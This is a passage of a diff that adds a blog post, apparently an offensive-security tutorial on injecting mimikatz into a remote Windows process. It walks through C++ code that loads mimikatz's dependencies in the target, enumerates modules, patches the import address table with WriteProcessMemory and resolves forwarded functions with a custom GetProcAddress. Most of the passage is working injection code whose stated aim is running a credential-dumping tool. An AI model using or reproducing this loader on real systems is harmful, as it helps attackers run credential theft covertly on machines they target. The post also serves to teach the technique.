+    <span class="p">{</span>
+        <span class="n">libName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
+
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] library to load: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">libName</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">remoteLoadLibrary</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">libName</span><span class="p">))</span>
+            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+
+        <span class="n">importDescriptor</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now let’s check if our process has successfuly loaded <code class="language-plaintext highlighter-rouge">mimikatz</code> dependencies.
+<img src="assets/img/posts/20240124/loadDependancies.png" alt="Mimikatz dependancies loaded" /></p>
+
+<p>We can observe that our process has loaded all mimikatz dependencies. Now let’s find a way to find the libraries base address in our code to be able to fix the IAT addresses.</p>
+
+<h2 id="resolve-the-functions-and-libraries-addresses-on-the-remote-process">Resolve the functions and libraries addresses on the remote process</h2>
+
+<h3 id="retrieve-the-libraries-and-function-addresses">Retrieve the libraries and function addresses</h3>
+
+<p>Now that we have our remote process with <code class="language-plaintext highlighter-rouge">mimikatz</code> dependancies loaded, we need to retrieve the address of the functions referenced in the IAT to be able to patch it. Otherwise, the pointers of the DLL imports will point to incorrect addresses.</p>
+
+<p>To retrieve the loaded libraries in the remote process, we need to create a snapshot of our remote process using the function <code class="language-plaintext highlighter-rouge">CreateToolhelp32Snapshot</code>. The function will return a <code class="language-plaintext highlighter-rouge">HANDLE</code> on the snapshot on which we will be able to call the functions <code class="language-plaintext highlighter-rouge">Module32FirstW</code> and <code class="language-plaintext highlighter-rouge">Module32NextW</code> to retrieve the different libraries with the corresponding addresses. The functions return a <code class="language-plaintext highlighter-rouge">MODULEENTRY32W</code> structure used to represent the loaded library. <br />
+Let’s create a little function to enumerate the loaded libraries to determine if we can successfuly retrieve the corresponding addresses.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">listModulesOfProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">;</span>
+    <span class="n">MODULEENTRY32W</span> <span class="n">me32</span><span class="p">;</span>
+
+    <span class="n">mod</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPMODULE</span> <span class="o">|</span> <span class="n">TH32CS_SNAPMODULE32</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mod</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"ERROR in creating SnapShot: %x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">me32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">MODULEENTRY32W</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Module32FirstW</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"No Module Found %x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">mod</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"Loaded Modules:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"name</span><span class="se">\t\t\t</span><span class="s"> base address</span><span class="se">\t\t\t</span><span class="s">size</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"=================================================================================</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"%#25ws</span><span class="se">\t\t</span><span class="s">%#10llx</span><span class="se">\t\t</span><span class="s">%#10d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">modBaseSize</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Module32NextW</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">));</span>
+    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">mod</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><img src="assets/img/posts/20240124/libAddr.png" alt="Get DLL addresses" /></p>
+
+<p>We can observe that we can retrieve the correct addresses for the loaded libraries.<br />
+Let’s create a function to create a snapshot of our remote process and another function to retrieve a module from its name and from a <code class="language-plaintext highlighter-rouge">HANDLE</code> of the remote process snapshot.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">HANDLE</span> <span class="nf">getSnapShotProcess</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">;</span>    
+    <span class="n">mod</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPMODULE</span> <span class="o">|</span> <span class="n">TH32CS_SNAPMODULE32</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mod</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_err</span><span class="p">(</span><span class="s">"CreateToolhelp32Snapshot error %x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="nb">nullptr</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">mod</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="n">MODULEENTRY32W</span> <span class="nf">getModuleEntry</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">snapShotHandle</span><span class="p">,</span> <span class="n">PWSTR</span> <span class="n">moduleSearched</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">MODULEENTRY32W</span> <span class="n">me32</span><span class="p">;</span>
+    <span class="n">me32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">MODULEENTRY32W</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">Module32FirstW</span><span class="p">(</span><span class="n">snapShotHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+    <span class="p">}</span>
+    <span class="k">do</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lstrcmpiW</span><span class="p">(</span><span class="n">me32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">))</span>
+        <span class="p">{</span>
+            <span class="k">return</span> <span class="n">me32</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">Module32NextW</span><span class="p">(</span><span class="n">snapShotHandle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">me32</span><span class="p">));</span>
+    <span class="k">return</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Like we would have done in a reflective loader, from the import descriptors retrieved previously, we will import locally the libraries needed by our injected PE. It will be used to retrieve the offset of our functions. Then we will iterate over all the <code class="language-plaintext highlighter-rouge">thunks</code> of the import descriptors. These thunks are data structures describing functions corresponding to the library imports.<br />
+The <code class="language-plaintext highlighter-rouge">thunks</code> can reference the corresponding function by its ordinal or by its name. Therefore, it is needed to apply the macro <code class="language-plaintext highlighter-rouge">IMAGE_SNAP_BY_ORDINAL</code> used to determine if the <code class="language-plaintext highlighter-rouge">thunk</code> reference the function through its ordinal or its name <code class="language-plaintext highlighter-rouge">IMAGE_SNAP_BY_ORDINAL(thunk-&gt;u1.Ordinal)</code>. <br />
+If the function is referenced by ordinal, we can resolve the function by calling <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to resolve the function address.
+If the function is referenced by its name, we need to calculate the pointer to the name: <code class="language-plaintext highlighter-rouge">PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)pImage + thunk-&gt;u1.AddressOfData - offsetRdata);</code>. Then, we can call the function <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to resolve the function address.
+Once we have the function address, we can calculate its offset in the corresponding library to be able to calculate its address in the remote process.<br />
+Now we need to find the thunk location on the remote process to write our patched address. We need to:</p>
+<ul>
+  <li>retrieve the address of the function address to patch <code class="language-plaintext highlighter-rouge">&amp;(thunk-&gt;u1.Function)</code></li>
+  <li>apply the <code class="language-plaintext highlighter-rouge">.rdata</code> offset on the address previously retrieved <code class="language-plaintext highlighter-rouge">(PBYTE)(&amp;(thunkFct-&gt;u1.Function)) + offsetRdata</code></li>
+  <li>substract the address of DLL locally loaded: <code class="language-plaintext highlighter-rouge">(PBYTE)(&amp;(thunk-&gt;u1.Function)) + offsetRdata - (PBYTE)pImage</code></li>
+  <li>finally add the address of memory allocation on the remote process: <code class="language-plaintext highlighter-rouge">(PBYTE)(&amp;(thunk-&gt;u1.Function)) + offsetRdata - (PBYTE)pImage + (PBYTE)allocAddrOnTarget</code></li>
+</ul>
+
+<p>Now we have everything, we can just call the function <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code> to patch the function address.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">fixImports</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Fixing Import table</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">importDescriptor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">importsDirectory</span> <span class="o">=</span> <span class="n">ntHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">Size</span> <span class="o">&lt;=</span> <span class="mi">20</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[*] Empty IAT"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">HMODULE</span> <span class="n">lib</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
+
+    
+    <span class="n">importDescriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)(</span><span class="n">importsDirectory</span><span class="p">.</span><span class="n">VirtualAddress</span> <span class="o">-</span> <span class="n">offsetRdata</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span><span class="p">);</span>
+    
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">PWSTR</span> <span class="n">moduleSearched</span> <span class="o">=</span> <span class="n">strToWstr</span><span class="p">((</span><span class="n">LPSTR</span><span class="p">)(</span><span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span> <span class="o">-</span> <span class="n">offsetRdata</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span><span class="p">));</span>
+        <span class="n">lib</span> <span class="o">=</span> <span class="n">LoadLibraryW</span><span class="p">(</span><span class="n">moduleSearched</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">lib</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">_err</span><span class="p">(</span><span class="s">"Error in retrieving locally the lib %ws -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">MODULEENTRY32W</span> <span class="n">me32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">);</span>
+        <span class="n">_dbg</span><span class="p">(</span><span class="s">"Import found %ws -&gt; %ws @ 0x%p </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">moduleSearched</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">PIMAGE_THUNK_DATA</span> <span class="n">thunk</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+            <span class="n">thunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_THUNK_DATA</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">importDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
+
+            <span class="k">while</span> <span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+            <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">IMAGE_SNAP_BY_ORDINAL</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">))</span>
+                <span class="p">{</span>
+                    <span class="n">LPCSTR</span> <span class="n">functionOrdinal</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">IMAGE_ORDINAL</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">);</span>
+
+                    <span class="n">PVOID</span> <span class="n">remoteAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">)</span> <span class="o">+</span> <span class="n">offsetRdata</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">);</span>
+                    <span class="n">PVOID</span> <span class="n">localAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionOrdinal</span><span class="p">);</span>
+                    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">localAddr</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span><span class="p">;</span>
+                    <span class="n">ULONGLONG</span> <span class="n">addrFix</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">remoteAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addrFix</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">))</span>
+                    <span class="p">{</span>
+                        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in fixing address of function number %d -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+                    <span class="p">}</span>
+                    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[*] Imported function number %d @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Ordinal</span><span class="p">,</span> <span class="n">addrFix</span><span class="p">);</span>
+
+                <span class="p">}</span>
+                <span class="k">else</span>
+                <span class="p">{</span>
+                    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">functionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_BY_NAME</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">AddressOfData</span> <span class="o">-</span> <span class="n">offsetRdata</span><span class="p">);</span>
+                    <span class="n">PVOID</span> <span class="n">remoteAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">thunk</span><span class="o">-&gt;</span><span class="n">u1</span><span class="p">.</span><span class="n">Function</span><span class="p">))</span> <span class="o">+</span> <span class="n">offsetRdata</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pImage</span> <span class="o">+</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">allocAddrOnTarget</span><span class="p">);</span>
+
+                    <span class="n">PVOID</span> <span class="n">addrFunc</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">lib</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">);</span>
+                    <span class="n">DWORD</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="n">PVOID</span> <span class="n">addrFix</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">addrFunc</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">lib</span><span class="p">;</span>
+                    <span class="n">addrFix</span> <span class="o">=</span> <span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">me32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+                
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">remoteAddr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addrFix</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">))</span>
+                    <span class="p">{</span>
+                        <span class="n">_err</span><span class="p">(</span><span class="s">"Error in fixing address of function %s -&gt; 0x%x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+                    <span class="p">}</span>
+
+
+                    <span class="n">_dbg</span><span class="p">(</span><span class="s">"</span><span class="se">\t</span><span class="s">[*] Imported function %s @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">addrFix</span><span class="p">);</span>
+
+                <span class="p">}</span>
+                <span class="n">thunk</span><span class="o">++</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="n">importDescriptor</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Now let’s wrap up everything and test if it is working. 
+<img src="assets/img/posts/20240124/AccessViolation.png" alt="Access Violation on execution" /></p>
+
+<p>If we put a debugger on our remote process, we can observe that when we resume the main thread, the process crashes with an access violation. If we look at the address where the access violation occurs, we can observe that it is related to the function <code class="language-plaintext highlighter-rouge">LsaConnectUntrusted</code> from the library <code class="language-plaintext highlighter-rouge">Secur32.dll</code>.<br />
+Let’s find out what happened.<br />
+Let’s write a little C code to perform <code class="language-plaintext highlighter-rouge">D/Invoke</code> on the function <code class="language-plaintext highlighter-rouge">LsaConnectUntrusted</code>.
+<img src="assets/img/posts/20240124/loadLib.png" alt="D/Invoke on LsaConnectUntrusted" />
+We can observe that despite using a <code class="language-plaintext highlighter-rouge">HANDLE</code> on <code class="language-plaintext highlighter-rouge">Secur32.dll</code>, the address of <code class="language-plaintext highlighter-rouge">LsaConnectUntrusted</code> is located in the library <code class="language-plaintext highlighter-rouge">sspicli.dll</code>.<br />
+It is what we call a <code class="language-plaintext highlighter-rouge">Forwarded Function</code>. It is an exported function of <code class="language-plaintext highlighter-rouge">Secur32.dll</code> but which is forwarded to the library <code class="language-plaintext highlighter-rouge">sspicli.dll</code>.</p>
+
+<h2 id="handle-forwarded-functions-on-remote-process">Handle forwarded functions on remote process</h2>
+
+<h3 id="definition-of-a-forwarded-function">Definition of a forwarded function</h3>
+
+<p>First let’s define what is a forwarded function.<br />
+In the context of dynamic-link libraries (DLLs), a forwarded function refers to a function that is not directly implemented within the DLL itself but is instead provided by another DLL. When a program calls a forwarded function in a DLL, the control is transferred to the corresponding function in another DLL.<br />
+The forwarding information is typically stored in the export table of the DLL. The export table contains a list of functions that the DLL makes available to other programs, and for forwarded functions, it includes a reference to the DLL and the specific function to which the call should be forwarded.</p>
+
+<p>Here is a simplified example to illustrate how a forwarded function might be set up:</p>
+<ul>
+  <li>Original DLL (A.dll):
+    <ul>
+      <li>Implements some functions.</li>
+      <li>Has an export table that includes information about the functions it exports.</li>
+    </ul>
+  </li>
+  <li>Forwarded DLL (B.dll):
+    <ul>
+      <li>Implements the forwarded function(s).</li>
+      <li>When A.dll exports a function that is forwarded to B.dll, the export table of A.dll contains information about the forwarding, specifying that the function is provided by B.dll.</li>
+    </ul>
+  </li>
+  <li>Client Program:
+    <ul>
+      <li>Calls a function from A.dll, including the forwarded function.</li>
+      <li>When the forwarded function is called, control is transferred to B.dll, where the actual implementation resides.</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="custom-getprocaddress">Custom GetProcAddress</h3>
+
+<p>To be able to determine if a function is a forwarded function, we need to implement a custom <code class="language-plaintext highlighter-rouge">GetProcAddress</code> function which will return the forwarded library name and the forwarded function name if we are in the context of a forwarded function.</p>
+
+<p><code class="language-plaintext highlighter-rouge">GetProcAddress</code> function parses the loaded library passed in argument. First the function needs to retrieve the export directory of the library.</p>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">PVOID</span> <span class="nf">getAddrFunction</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">lib</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">functionName</span><span class="p">,</span> <span class="n">PCHAR</span><span class="o">&amp;</span> <span class="n">forwardedLib</span><span class="p">,</span> <span class="n">PCHAR</span><span class="o">&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// Get DOS Header
+</span>
+    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">dosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">lib</span><span class="p">;</span>
+    <span class="c1">// Get Nt Header
+</span>
+    <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">imageNTHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">dosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
+    <span class="c1">//Get offset of export directory
+</span>
+    <span class="n">DWORD_PTR</span> <span class="n">exportDirectoryRVA</span> <span class="o">=</span> <span class="n">imageNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">;</span>
+    <span class="c1">// Get export directory size
+</span>
+    <span class="n">SIZE_T</span> <span class="n">exportDirectorySize</span> <span class="o">=</span> <span class="n">imageNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">Size</span><span class="p">;</span>
+    
+    <span class="c1">// Retrieve the export directory
+</span>
+    <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">imageExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">exportDirectoryRVA</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Once we have the export directory, we will retrieve 3 arrays:</p>
+<ul>
+  <li>an array containing the addresses of the exported functions</li>
+  <li>an array containing the ordinal of the exported functions</li>
+  <li>an array containing the names of the exported funtions</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">// Get array containing the addresses of the exported functions
+</span>
+<span class="n">PDWORD</span> <span class="n">addressOfFunctionsRVA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">lib</span> <span class="o">+</span> <span class="n">imageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
+
+<span class="c1">// Get array containing the names of the exported funtions
+</span>
